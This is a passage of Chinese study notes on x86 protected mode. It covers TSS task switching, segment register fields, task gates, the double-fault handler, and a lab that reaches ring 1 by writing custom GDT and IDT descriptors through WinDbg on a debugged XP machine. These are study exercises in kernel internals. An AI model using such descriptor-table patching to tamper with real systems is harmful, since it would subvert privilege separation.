0x00000010, //ss * 3环：0x23 0x00000023, //ds * 0x00000030, //fs * 3环：0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IO权限位图，VISTA之后不再用了，这是从现有的TSS结构体拷出来的 &#125;; //输出看((DWORD)stack) + 100的地址，后面用windbg看任务切换的esp作对比用 printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //修改GDT表 printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //因为变量声明顺序的问题，输入cr3的语句在这里。然后再赋给tss数组里的cr3字段 printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //执行该exe后，在WinDbg中用该指令获取：!process 0 0 tss[7]=cr3; *(DWORD*)(&amp;buffer[0])=0x12345678; *(WORD*)(&amp;buffer[4])=0x48; //段选择子0x48，拆完索引到的是8003f048 __asm &#123; //切换前保存旧TR str ax lea edi,[PrevTR+4] mov [edi],ax jmp fword ptr [buffer]; &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;返回代码：123456 __asm &#123; jmp fword ptr ds:[PrevTR] //jmp方式返回 &#125;&#125;12345678910 __asm &#123;+ int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 jmp fword ptr ds:[PrevTR] //jmp方式返回 &#125;直接执行，因int 3会断在windbg下efl是2，NT位为0TR是0x48，就是刚才jmp的buffer再jmp回去前，PrevTR[6]如图：回跳时不依靠NT位，相当于是直接跳过去的，不会依赖上一次的任务链 总结 体会 对于修改TR寄存器部分的内容有新的理解： CALL FAR或JMP FAR访问0x48:0x123456 如果0x48是代码段，由CS当选择子 如果0x48是任务段，由TR当选择子 TSS任务段切换步骤 调用 call/jmp + TSS任务段选择子 CPU将调用者的寄存器存入当前TR寄存器对应的TSS中。 将TSS任务段选择子加载到TR寄存器中 将新的TR寄存器对应的TSS任务段中的所有寄存器全部替换。 call和jmp进行任务切换的不同之处 JMP指令进行任务切换，TSS段中的PreviousLink不会被赋值。且NT位不变。 CALL指令进行任务切换，TSS段中的PreviousLink会被填入上一个TSS段所属TSS段描述符的段选择子。且NT位被置1. ESP和ESP0 当我们主动JMP CALL任务段或任务门时，CPU会将ESP SS替换。 当我们通过调用门、中断门这种提权时，CPU会去找TSS，这种可以理解为被动。这时会根据新CS的权限来选择替换ESP0 SS0、ESP1 SS1还是ESP2 SS2。 线程切换时用TSS赋值，一个线程一个TSS。进0环后使用堆栈，比如ESP来到F1234567，用完是1234660，然后离开了。下次进来，因为TSS的值没变，下次还是从F1234567进来。 每个线程两个堆栈，一个3环的，一个0环的。"},{"title":"段寄存器","path":"/wiki/Protected_Mode/段寄存器.html","content":"环境 xp,vc++ 段寄存器简介 8个 ES CS SS DS FS GS LDTR TR Windows操作系统不使用GS寄存器，一进0坏就变0，比如断点，异常，故用-表示。 FS寄存器与线程相关。 段寄存器 Selector Attribute Base Limit ES 0023 可读、可写 0 0xFFFFFFFF CS 001B 可读、可执行 0 0xFFFFFFFF SS 0023 可读、可写 0 0xFFFFFFFF DS 0023 可读、可写 0 0xFFFFFFFF FS 003B 可读、可写 0x7FFDE000 0xFFF GS - - - - 可读：可以当源操作数。如 1mov ax,cs 可写：当前段寄存器修饰的地址，可修改，可放到目的操作数。如 1mov dword ptr ds:[var],eax; 可执行：当前段寄存器修饰的地址可赋值给eip 结构 96位，16位可见，80位不可见 16位Selecter；32位Base，32位Limit，16位Attribute。 名称 位数 含义 Selecter 16 Base 32 表示段从哪里开始。每 Limit 32 表示段的长度是多少 Attribute 16 属性，表示段寄存器是否可读，可写，可执行 用OD随意加载一个程序，4位十六进制数，16位： 结构体表示 123456789struct SegMent&#123; //可见 WORD Selector;//16位Selector //不可见 WORD Attributes;//16位Attributes DWORD Base;//32位Base DWORD Limit;//32位Limit&#125; 这个结构是从段描述符中加载出来的，没有顺序的严格要求 段寄存器的读写 读段寄存器 1MOV AX,EX;只能读16位的可见部分 读写LDTR： 1SLDT 1LLDT 读写TR： 1STR 1LTR 写段寄存器 1MOV DS,AX;写96位 练习 段寄存器只能看见16位，如何证明有96位? 思考🤔方向利用不同段寄存器不可见部分的异同，证明有差异答案 探测AttributeAttribute：属性，表示段寄存器是否可读，可写，可执行段寄存器AttributeCS可读、可执行ES可读、可写SS可读、可写DS可读、可写FS可读、可写CS段寄存器的Attribute不可写，其他段寄存器可写，利用这一点来探测Attribute。比如拿DS段寄存器。验证：CS不可写，DS可写，即可。(利用AX寄存器作为中转，将CS段寄存器的值传给DS)123456789101112131415#include &lt;stdio.h&gt;int var=0;int main(void)&#123; __asm&#123; mov dword ptr ds:[var],10; //可写 mov ax,cs; mov ds,ax; mov dword word ds:[var],10; //不可写 //var就是一个内存地址的标号 &#125; return 0;&#125;第一个mov第二个mov赋值成功赋值失败一般在访问的内存地址无效的情况下才弹这种窗。而现在我们访问的内存地址是有效的，这是因为段的机制限制了我们不能访问这块内存 探测BaseBase：表示段从哪里开始段寄存器BaseES0CS0SS0DS0FS0x7FFDE000GS-利用这两点来证明Base存在：只有FS段寄存器的Base为0x7FFDE000，其他均为0。在内存空间中，地址为0是不可读也不可写的。123456789101112131415#include &lt;stdio.h&gt;int var=0;int main(void)&#123; __asm&#123; mov ax,fs //fs 的 base为TEB 用ds编译不过去?mark mov gs,ax mov eax,gs:[0] //gs现在是fs的值，fs.base+0 //相当于 //mov edx,dword ptr ds:[0x7FFDE000] //ds的base默认是0，这个地址是可以访问的 mov dword ptr ds:[var],eax //ds的base默认是0，0+var变量的地址，即var变量的值 &#125; return 0;&#125;编译通过。读到了fs.base+0地址处的值，说明base存在。如果单步调试，执行到mov eax,gs:[0]，出现内存访问冲突错误。原因：在DEBUG的状态下，每次F10单步调试，会触发单步调试异常，进入内核，然后走出内核，操作系统会把gs清零了，然后代码中想通过gs:[0]进行寻址，访问的地址是0，故导致实验无法成功。gs换成es，就可以单步调试，看到最后一行var的值成功被修改 探测LimitLimit：表示段的长度是多少段寄存器LimitES0xFFFFFFFFCS0xFFFFFFFFSS0xFFFFFFFFDS0xFFFFFFFFFS0xFFFGS-12345678910111213141516#include &lt;stdio.h&gt;int var=0;int main(void)&#123; __asm&#123; mov ax,fs //fs 的 base为TEB 用ds编译不过去?mark mov gs,ax mov eax,gs:[0x1000] //gs现在是fs的值，fs.base+0。0x7FFDE000+0x10000 //相当于上一句指令访问的地址相当于注释掉这一句的指令。只不过ds的limit是0xFFFFFFFF，而fs的limit是0xFFF //上一句故意比limit大1，0xFFF+1=0x1000。所以编译会失败，而ds的limit比0x1000大，所以编译能通过。 //mov eax,ds:[0x7FFDE000+0x1000] //这一句能编译通过 mov dword ptr ds:[var],eax //ds的base默认是0，0+var变量的地址，即var变量的值 &#125; return 0;&#125;要调试的话，把gs换成es寄存器 写段寄存器时，只给了16位，剩下的80位填什么? 答案答案在下一节内容 草稿区 属性探测参考： 保护模式篇——段寄存器 X86内核笔记_1_CPU保护模式-看雪论坛-SSH山水画 以后可能有用：收录先 说明： https://m-ouse.github.io/post/深入理解wow64-I/ https://blog.csdn.net/gatieme/article/details/50647000 VMware0606-暂记： https://www.zhihu.com/question/64511903"},{"title":"任务门","path":"/wiki/Protected_Mode/任务门.html","content":"要点回顾 在上一节中讲解了如何通过CALL、JMP指令访问任务段。 这一节课主要介绍如何通过任务门去访问任务段。 IDT表包含3种门描述符： 任务门描述符 中断门描述符 陷阱门描述符 中断，陷阱之前讲过了。 任务门描述符 低32位，TSS Segment Selector是一个段选择子，指向GDT表中的TSS段描述符。 Reserved，保留位，实验时填0。 任务门执行流程 INT N，N为中断门索引号 查IDT表，找到任务门描述符 通过任务门描述符中的TSS Segment Selector字段，来查GDT表，找到任务段描述符 使用TSS段中的值修改寄存器 IRETD返回 课后练习题 自己实现一个任务门 实验过程构造TSS段描述符和任务门段描述符测试代码运行构造TSS段描述符，改GDT表和《任务段》文章一样，根据代码运行后的终端提示对GDT表进行修改12345678910111213kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0000e912`fd780068kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd780068构造任务门段描述符，改IDT表8003f048，index是9TI=0，查GDT表ROL=110000 0000 0100 1 0 110000 0000 0100 1011所以段选择子是0x4BReserved：0000P：1DPL：110Type：0101Reserved：00TSS Segment Selector：004BReserved：0000综上，构造的任务门描述符是：0000e500`004b0000改8003f500这个P位为0的无效段描述符，Index是32，0x20。所以代码中用int 0x2012345678910111213141516171819202122232425262728293031323334353637kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000kd&gt; eq 8003f500 0000e500`004b0000kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0000e500`004b0000和call 任务段代码对比完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd //call方式返回 &#125;&#125;int main()&#123; char buffer[6]; //构造任务段 char stack[100]=&#123;0&#125;; //找了一个局部变量的地址当堆栈堆栈用 DWORD cr3=0; //构造TSS，注释标有*说明为必填值 DWORD tss[0x68]=&#123; //0x68，104字节 0x00000000, //link，上一个任务的TR段选择子。在发生任务切换时CPU会自动填充 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * 跳转的地址 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3环：0x1B 0x00000010, //ss * 3环：0x23 0x00000023, //ds * 0x00000030, //fs * 3环：0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IO权限位图，VISTA之后不再用了，这是从现有的TSS结构体拷出来的 &#125;; //输出看((DWORD)stack) + 100的地址，后面用windbg看任务切换的esp作对比用 printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //修改GDT表 printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //因为变量声明顺序的问题，输入cr3的语句在这里。然后再赋给tss数组里的cr3字段 printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //执行该exe后，在WinDbg中用该指令获取：!process 0 0 tss[7]=cr3;- *(DWORD*)(&amp;buffer[0])=0x12345678;- *(WORD*)(&amp;buffer[4])=0x48; //段选择子0x48，拆完索引到的是8003f048 __asm &#123;- call fword ptr [buffer];+ int 0x20 //索引号32，8003f500+ //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //找了一个局部变量的地址当堆栈堆栈用 DWORD cr3=0; //构造TSS，注释标有*说明为必填值 DWORD tss[0x68]=&#123; //0x68，104字节 0x00000000, //link，上一个任务的TR段选择子。在发生任务切换时CPU会自动填充 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * 跳转的地址 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * 0x00000008, //cs * 3环：0x1B 0x00000010, //ss * 3环：0x23 0x00000023, //ds * 0x00000030, //fs * 3环：0x3B 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IO权限位图，VISTA之后不再用了，这是从现有的TSS结构体拷出来的 &#125;; //输出看((DWORD)stack) + 100的地址，后面用windbg看任务切换的esp作对比用 printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //修改GDT表 printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //因为变量声明顺序的问题，输入cr3的语句在这里。然后再赋给tss数组里的cr3字段 printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //执行该exe后，在WinDbg中用该指令获取：!process 0 0 tss[7]=cr3; __asm &#123; int 0x20 //索引号32，8003f500 //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 0;&#125;编译运行改GDT表12345678910111213kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0000e912`fd780068kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0000e912`fd780068改IDT表12345678910111213141516171819202122232425262728293031323334353637kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000kd&gt; eq 8003f500 0000e500`004b0000kd&gt; dq 8003f400 L218003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0000e500`004b0000IDT表可以执行exe前就改了，如果执行后连改两个表，可能因为我电脑问题，windbg会一直BUSY使用!process 0 0查看该exe的DirBase，输入到终端运行成功，执行过程没遇到错误 在保护模式中，当CPU检测到异常的时候，会根据异常的类型来查找对应的异常处理函数，比如:当指令检测到除零异时,将默认执行0号中断，请列出处理除零异常函数的地址。 答案参考：段和门小结-练习7-羽夏的博客为什么任务段可以用call far访问还要有任务门-SD’Blog12kd&gt; dq 8003f400 L28003f400 80538e00`0008f19c 80538e00`0008f3140号中断，80538e00`0008f19c处理除零异常函数的地址：8053f19c12345678910kd&gt; u 8053f19cnt!KiTrap00:8053f19c 6a00 push 08053f19e 66c74424020000 mov word ptr [esp+2],08053f1a5 55 push ebp8053f1a6 53 push ebx8053f1a7 56 push esi8053f1a8 57 push edi8053f1a9 0fa0 push fs8053f1ab bb30000000 mov ebx,30hu命令，反汇编指定地址处的代码 在保护模式中，当CPU检测到异常的时候，会根据异常的类型来查找对应的异常处理函数，比如:当指令检测到除零异常时，将默认执行0号中断所指定的异常处理程序，但是，异常处理程序本身任然可能出现异常，如果异常处理程序出现异常时候（双重错误），CPU会默认执行8号中断，请分析8号中断是什么?做了什么事情?替换了哪些寄存器?替换后的值是多少?为什么这样设计? 答案123456kd&gt; dq 8003f400 L98003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`005011988号中断00008500`00501198P位是1，有效。S位为0，系统段。Type为5，这是个任务门。TSS Segment Selector是00500000 0000 0101 00000000 0000 0101 0 0 00index是10看对应GDT表中的描述符：1234567kd&gt; dq 8003f000 LB8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffa00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068TSS段描述符80008954`af000068，base是8054af00看这块TSS上的eip字段123456789kd&gt; dd 8054af008054af00 00000000 80547f00 00000010 000000008054af10 00000000 00000000 00000000 00b180008054af20 805404ce 00000000 00000000 000000008054af30 00000000 00000000 80547f00 000000008054af40 00000000 00000000 00000023 000000088054af50 00000010 00000023 00000030 000000008054af60 00000000 20ac0000 00000000 80547f008054af70 00000010 00000000 00000000 00000000第8个（0~8）是eip，即805404ce1234567891011121314151617181920212223242526kd&gt; uf 805404cent!KiTrap08:805404ce fa cli805404cf 8b0d3cf0dfff mov ecx,dword ptr ds:[0FFDFF03Ch]805404d5 8d4150 lea eax,[ecx+50h]805404d8 c6400589 mov byte ptr [eax+5],89h805404dc 9c pushfd805404dd 812424ffbfffff and dword ptr [esp],0FFFFBFFFh805404e4 9d popfd805404e5 a13cf0dfff mov eax,dword ptr ds:[FFDFF03Ch]805404ea 8a6857 mov ch,byte ptr [eax+57h]805404ed 8a4854 mov cl,byte ptr [eax+54h]805404f0 c1e110 shl ecx,10h805404f3 668b4852 mov cx,word ptr [eax+52h]805404f7 a140f0dfff mov eax,dword ptr ds:[FFDFF040h]805404fc 890d40f0dfff mov dword ptr ds:[0FFDFF040h],ecxnt!KiTrap08+0x34:80540502 6a00 push 080540504 6a00 push 080540506 6a00 push 080540508 50 push eax80540509 6a08 push 88054050b 6a7f push 7Fh8054050d e8048dfbff call nt!KeBugCheck2 (804f9216)80540512 ebee jmp nt!KiTrap08+0x34 (80540502)在程序执行过程中，可能会出现一个异常。当异常产生时，即错误产生时，CPU会走指定中断进行异常处理。但在异常处理过程中，也可能会发生错误。如果再次发生错误，CPU将会走8号中断，即所谓的双重错误。int 8是如何接管处理的呢？一旦进入8号中断，将会替换一堆寄存器，保证CPU 能跳到一个正确的地方去执行（除非那个地方也被破坏了），此时什么错误都无所谓了，收集信息后，蓝屏。对于Windows系统来说，基本就是以蓝屏的形式出现。未来To do:8号中断具体函数内容，要用IDA看，未来看。如何看参考羽夏的博客 思考题 既然已经有任务段了，为什么还要有任务门呢？ 答案1-一家之言我感觉这个答案比答案2更好。答案参考：视频同学的回答+为什么任务段可以用call far访问还要有任务门-SD’Blog上面题目分析了8号中断，就是用的任务门。所以任务门为异常(INT)提供了一种可切换任务的机制,是一种被动的机制。而单纯的任务段必须被主动调用(CALL JMP)。答案2-一家之言来自：任务门进1环-看雪-评论区wx_大可爱的回答如果你用jmp跳到TSS段，你还得自己jmp回到之前的TR寄存所保存的TSS段。如果是call的话你还得修改下EFLAG寄存器的NT位，之后用iret返回。还不如直接用状态门，只需要搞一个任务门，之后直接iret返回，不需要修改EFLAG和不需要自己jmp回来.这也许就是任务门的优点吧 考试题：使用任务门进1环 实验过程分析代码运行调试参考链接：段和门小结-羽夏的博客任务门进1环-看雪cs和ss需要自己构造1环下，cs和ss的值，cs和ss在GDT表中的段描述符。根据《段权限检查》CPL章节知，cs和ss的后两位要一样，因为在1环，所以都是01。那index呢？index是GDT表的索引，cs的index到GDT表是代码段，ss的index到GDT表是数据段（个人理解：就是存放数据的内存，拿来当堆栈用）。分析一下我们之前0环和3环的cs和ss，然后用它们的index看下对应GDT表中哪些描述符，然后构造1环下cs和ss的段描述符。cs:0x1Bcs:0x08几环3环0环十六进制0000 0000 0001 10110000 0000 0000 1000按字段拆0000 0000 0001 1 0 110000 0000 0000 1 0 00Index31TI00CPL30ss:0x23ss:0x10几环3环0环十六进制0000 0000 0010 00110000 0000 0001 0000按字段拆0000 0000 0010 0 0 110000 0000 0001 0 0 00Index42TI00CPL30序号地址段描述符P位有效or无效S位TYPE域（第三个十六进制数）数据段or代码段DPL18003f00800cf9b00`0000ffff1有效1≥8，1011代码段0028003f01000cf9300`0000ffff1有效1＜8，0011数据段0038003f01800cffa00`0000ffff1有效1≥8，1010代码段1148003f02000cff300`0000ffff1有效1＜8，0011数据段11cs:0x08，0环，index是1，对应的段描述符是00cf9b00`0000ffff，改DPL为01后为，00cfbb00`0000ffffss:0x10，0环，index是2，对应的段描述符是00cf9300`0000ffff，改DPL为01后为，00cfb300`0000ffff在GDT表中找两个无效的段描述符写入，找的序号地址段描述符P位有效or无效S位188003f09000000000`000000000无效0198003f09800000000`000000000无效0序号18的改为1环的代码段：1eq 8003f090 00cfbb00`0000ffff序号19的改为1环的数据段：1eq 8003f098 00cfb300`0000ffff所以构造的1环cs和ss是：csssindex1819TI00CPL0101按字段拆0000 0000 1001 0 0 010000 0000 1001 1 0 01十六进制0000 0000 1001 00010000 0000 1001 10010x910x99fs看的两篇参考文章都构造了fs，没太明白，后面应该会学到fs。这里我也分析改一下，但分析过程不知道对不对。fs:0x3Bfs:0x30几环3环0环十六进制0000 0000 0011 10110000 0000 0011 0000按字段拆0000 0000 0011 1 0 110000 0000 0011 0 0 00Index76TI00CPL30序号地址段描述符P位有效or无效S位TYPE域（第三个十六进制数）数据段or代码段DPL68003f030ffc093df`f00000011有效1＜8，0011数据段0078003f0380040f300`00000fff1有效1＜8，0011数据段11fs:0x30，0环，index是6，对应的段描述符是ffc093df`f0000001，改DPL为01后为，ffc0b3df`f0000001在GDT表中找个无效的段描述符写入，找的序号地址段描述符P位有效or无效S位218003f0a800000000`000000000无效0序号21的改为1环fs用：1eq 8003f0a8 ffc0b3df`f0000001所以构造的1环fs是：fsindex21TI0CPL01按字段拆0000 0000 1010 1 0 01十六进制0000 0000 1010 00010xa9任务门段描述符，改IDT表同《课后练习题》1eq 8003f500 0000e500`004b0000TSS段描述符，改GDT表同《课后练习题》，根据终端提示的输出来改和任务门课后练习题代码对比完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwOK;DWORD dwESP;DWORD dwCS;void __declspec(naked) func() &#123; dwOK=1; __asm &#123; //int 3 mov eax,esp mov dwESP,eax //存任务切换后的esp的值 mov word ptr [dwCS],cs //存任务切换后cs的值 iretd &#125;&#125;int main()&#123; char stack[100]=&#123;0&#125;; //找了一个局部变量的地址当堆栈堆栈用 DWORD cr3=0; //构造TSS，注释标有*说明为必填值 DWORD tss[0x68]=&#123; //0x68，104字节 0x00000000, //link，上一个任务的TR段选择子。在发生任务切换时CPU会自动填充 0x00000000, //esp0 0x00000000, //ss0 0x00000000, //esp1 0x00000000, //ss1 0x00000000, //esp2 0x00000000, //ss2 cr3, //cr3* (DWORD)func, //eip * 跳转的地址 0x00000000, //eflags 0x00000000, //eax 0x00000000, //ecx 0x00000000, //edx 0x00000000, //ebx ((DWORD)stack) + 100, //esp * 0x00000000, //ebp 0x00000000, //esi 0x00000000, //edi 0x00000023, //es * + 0x00000091, //cs * 1环：0x91+ 0x00000099, //ss * 1环：0x99 0x00000023, //ds *+ 0x000000a9, //fs * 1环：0xa9 0x00000000, //gs 0x00000000, //ldt 0x20ac0000 //IO权限位图，VISTA之后不再用了，这是从现有的TSS结构体拷出来的 &#125;; //输出看((DWORD)stack) + 100的地址，后面用windbg看任务切换的esp作对比用 printf(&quot;Address of the ((DWORD)stack) + 100 :%p &quot;,((DWORD)stack) + 100); //修改GDT表 printf(&quot;Address of the tss array: %p &quot;, tss); // Print the 1st (leftmost) hexadecimal digit, 2nd hexadecimal digit, and the low 16 bits of the tss array address printf(&quot;1st Hex Digit: %02x, 2nd Hex Digit: %02x, Low 16 bits: %04x &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (DWORD)tss &amp; 0x0000FFFF); printf(&quot;In WinDbg, modify your constructed Task Segment Descriptor in the GDT table using the following command: eq 8003f048 %02x00e9%02x`%04x0068 &quot;, (DWORD)tss &gt;&gt; 28, ((DWORD)tss &gt;&gt; 16) &amp; 0x000000FF, (WORD)tss); //因为变量声明顺序的问题，输入cr3的语句在这里。然后再赋给tss数组里的cr3字段 printf(&quot;After running this executable, execute !process 0 0 in WinDbg, copy the value of DirBase for the TSS.exe process, and input it below. CR3: &quot;); scanf(&quot;%x&quot;,&amp;cr3); //执行该exe后，在WinDbg中用该指令获取：!process 0 0 tss[7]=cr3; __asm &#123; int 0x20 //索引号32，8003f500 //eq 8003f500 0000e500`004b0000 &#125; printf(&quot;ok = %x ESP = %x CS = %x &quot;,dwOK,dwESP,dwCS); return 